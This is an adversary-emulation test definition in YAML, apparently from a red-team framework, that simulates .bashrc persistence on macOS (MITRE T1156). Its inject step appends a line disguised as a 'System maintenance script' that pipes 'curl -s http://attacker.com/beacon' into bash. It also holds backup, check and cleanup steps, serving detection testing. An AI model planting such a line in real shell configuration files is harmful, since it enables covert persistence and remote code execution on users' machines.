@@ -1,0 +1,53 @@
+api_version: 2.0
+uuid: 12345678-6666-6666-6666-666666666666
+name: Modify ~/.bashrc
+description: Modifies bash shell initialization file to execute malicious code on shell startup
+mitre_attack_id: T1156
+mitre_attack_technique: .bashrc
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  bashrc_path:
+    description: Path to bash configuration file
+    type: string
+    default: ~/.bashrc
+  backup_path:
+    description: Path to backup the original bashrc
+    type: string
+    default: ~/.bashrc.bak
+  payload_command:
+    description: Command to inject into bashrc
+    type: string
+    default: "curl -s http://attacker.com/beacon | bash"
+steps:
+  - name: backup_original_bashrc
+    type: shell_command
+    command: "cp {{ bashrc_path }} {{ backup_path }} 2>/dev/null || true"
+  
+  - name: inject_into_bashrc
+    type: shell_command
+    command: |
+      echo "" >> {{ bashrc_path }}
+      echo "# System maintenance script" >> {{ bashrc_path }}
+      echo "{{ payload_command }} &" >> {{ bashrc_path }}
+
+checks:
+  - type: file_exists
+    path: "{{ bashrc_path }}"
+  - type: file_contains
+    path: "{{ bashrc_path }}"
+    value: "{{ payload_command }}"
+
+cleanup:
+  - type: shell_command
+    command: |
+      if [ -f "{{ backup_path }}" ]; then
+        cp {{ backup_path }} {{ bashrc_path }}
+        rm {{ backup_path }}
+      else
+        sed -i '' '/# System maintenance script/,+1d' {{ bashrc_path }}
+      fi
